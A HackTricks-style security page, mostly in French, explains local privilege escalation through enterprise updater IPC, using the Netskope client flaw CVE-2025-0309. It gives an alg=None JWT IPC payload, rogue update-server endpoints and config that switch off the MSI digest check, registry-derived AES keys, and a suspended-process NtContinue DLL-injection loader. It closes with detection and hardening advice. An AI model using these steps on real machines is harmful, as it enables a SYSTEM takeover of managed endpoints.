# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Cette page généralise une classe de chaînes d'escalade de privilèges locales Windows trouvées dans les agents endpoint d'entreprise et les updaters qui exposent une surface IPC à faible friction et un flux de mise à jour privilégié. Un exemple représentatif est Netskope Client for Windows < R129 (CVE-2025-0309), où un utilisateur à privilèges limités peut forcer l'enrôlement vers un serveur contrôlé par l'attaquant puis livrer un MSI malveillant que le service SYSTEM installe.

Idées clés réutilisables contre des produits similaires :
- Abuser de l'IPC localhost d'un service privilégié pour forcer un ré-enrôlement ou une reconfiguration vers un serveur attaquant.
- Implémenter les endpoints de mise à jour du vendor, livrer un Trusted Root CA rogue, et pointer l'updater vers un package malveillant « signé ».
- Éviter des vérifications de signature faibles (CN allow‑lists), flags de digest optionnels, et propriétés MSI laxistes.
- Si l'IPC est « chiffré », dériver la key/IV à partir d'identifiants machine lisibles globalement stockés dans le registry.
- Si le service restreint les appelants par image path/process name, injecter dans un process allow‑listé ou en en créer un suspendu et bootstrapper votre DLL via un minimal thread‑context patch.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Many agents ship a user‑mode UI process that talks to a SYSTEM service over localhost TCP using JSON.

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft a JWT enrollment token whose claims control the backend host (e.g., AddonUrl). Use alg=None so no signature is required.
2) Send the IPC message invoking the provisioning command with your JWT and tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Le service commence à contacter votre serveur malveillant pour enrollment/config, par ex. :
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Remarques :
- Si la vérification de l'appelant est path/name‑based, faites provenir la requête d'un binaire fournisseur figurant sur la liste blanche (voir §4).

---
## 2) Détournement du canal de mise à jour pour exécuter du code en tant que SYSTEM

Une fois que le client communique avec votre serveur, implémentez les endpoints attendus et redirigez-le vers un MSI malveillant. Séquence typique :

1) /v2/config/org/clientconfig → Retourner la configuration JSON avec un intervalle de mise à jour très court, par ex. :
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retourne un certificat CA au format PEM. Le service l’installe dans le magasin Local Machine Trusted Root.
3) /v2/checkupdate → Fournit des métadonnées pointant vers un MSI malveillant et une fausse version.

Bypass des contrôles courants observés sur le terrain :
- Signer CN allow‑list : le service peut simplement vérifier que le Subject CN est “netSkope Inc” ou “Netskope, Inc.”. Votre rogue CA peut émettre un certificat leaf avec ce CN et signer le MSI.
- CERT_DIGEST property : inclure une propriété MSI bénigne nommée CERT_DIGEST. Aucune vérification lors de l’installation.
- Optional digest enforcement : un flag de config (par ex., check_msi_digest=false) désactive la validation cryptographique supplémentaire.

Résultat : le service SYSTEM installe votre MSI depuis
C:\ProgramData\Netskope\stAgent\data\*.msi
exécutant du code arbitraire en tant que NT AUTHORITY\SYSTEM.

---
## 3) Falsification de requêtes IPC chiffrées (lorsqu'elles sont présentes)

Depuis R127, Netskope encapsulait le JSON IPC dans un champ encryptData qui ressemble à du Base64. Le reverse a montré un AES avec clé/IV dérivés de valeurs de registre lisibles par n’importe quel utilisateur :
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Les attaquants peuvent reproduire le chiffrement et envoyer des commandes chiffrées valides depuis un utilisateur standard. Astuce générale : si un agent se met soudainement à “chiffrer” son IPC, cherchez des device IDs, product GUIDs, install IDs sous HKLM comme matériau.

---
## 4) Contournement des allow‑lists d'appelants IPC (vérification de chemin/nom)

Certains services tentent d’authentifier le pair en résolvant le PID de la connexion TCP et en comparant le chemin/nom de l’image à des binaires vendor allow‑listés situés sous Program Files (par ex., stagentui.exe, bwansvc.exe, epdlp.exe).

Deux contournements pratiques :
- DLL injection dans un processus allow‑listé (par ex., nsdiag.exe) et proxy de l’IPC depuis l’intérieur.
- Lancer un binaire allow‑listé en état suspended et bootstrapper votre DLL proxy sans CreateRemoteThread (voir §5) pour satisfaire les règles de protection appliquées par le driver.

---
## 5) Injection compatible avec la protection anti‑manipulation : processus suspended + patch NtContinue

Les produits embarquent souvent un minifilter/OB callbacks driver (par ex., Stadrv) pour retirer les droits dangereux des handles vers les processus protégés :
- Process : supprime PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread : restreint à THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader user‑mode fiable qui respecte ces contraintes :
1) CreateProcess d’un binaire vendor avec CREATE_SUSPENDED.
2) Obtenir les handles encore autorisés : PROCESS_VM_WRITE | PROCESS_VM_OPERATION sur le processus, et un handle de thread avec THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou juste THREAD_RESUME si vous patcher du code à un RIP connu).
3) Écraser ntdll!NtContinue (ou un autre thunk précoce garanti mappé) par un petit stub qui appelle LoadLibraryW sur le chemin de votre DLL, puis revient.
4) ResumeThread pour déclencher votre stub en‑process, chargeant votre DLL.

Comme vous n’avez jamais utilisé PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME sur un processus déjà protégé (vous l’avez créé), la politique du driver est satisfaite.

---
## 6) Outils pratiques
- NachoVPN (Netskope plugin) automatise une rogue CA, la signature de MSI malveillant, et sert les endpoints nécessaires : /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope est un client IPC personnalisé qui fabrique des messages IPC arbitraires (optionnellement AES‑encrypted) et inclut l’injection via processus suspended pour émettre depuis un binaire allow‑listé.

---
## 7) Opportunités de détection (blue team)
- Surveiller les ajouts au Local Machine Trusted Root. Sysmon + registry‑mod eventing (voir les recommandations de SpecterOps) fonctionne bien.
- Signaler les exécutions de MSI initiées par le service de l’agent depuis des chemins comme C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Examiner les logs de l’agent pour des hosts/tenants d’enrôlement inattendus, p.ex. : C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – chercher les anomalies addonUrl / tenant et le provisioning msg 148.
- Alerter sur des clients IPC localhost qui ne sont pas les binaires signés attendus, ou qui proviennent d’arbres de processus enfants inhabituels.

---
## Conseils de durcissement pour les éditeurs
- Lier les hosts d’enrôlement/update à une allow‑list stricte ; rejeter les domaines non fiables dans clientcode.
- Authentifier les pairs IPC avec des primitives OS (ALPC security, named‑pipe SIDs) au lieu de vérifications basées sur le chemin/nom de l’image.
- Garder le matériel secret hors de HKLM lisible par tous ; si l’IPC doit être chiffré, dériver les clés à partir de secrets protégés ou négocier sur des canaux authentifiés.
- Traiter l’updater comme une surface de la chaîne d’approvisionnement : exiger une chaîne complète vers une CA de confiance que vous contrôlez, vérifier les signatures des paquets contre des clés épinglées, et échouer fermé si la validation est désactivée en config.

## Références
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
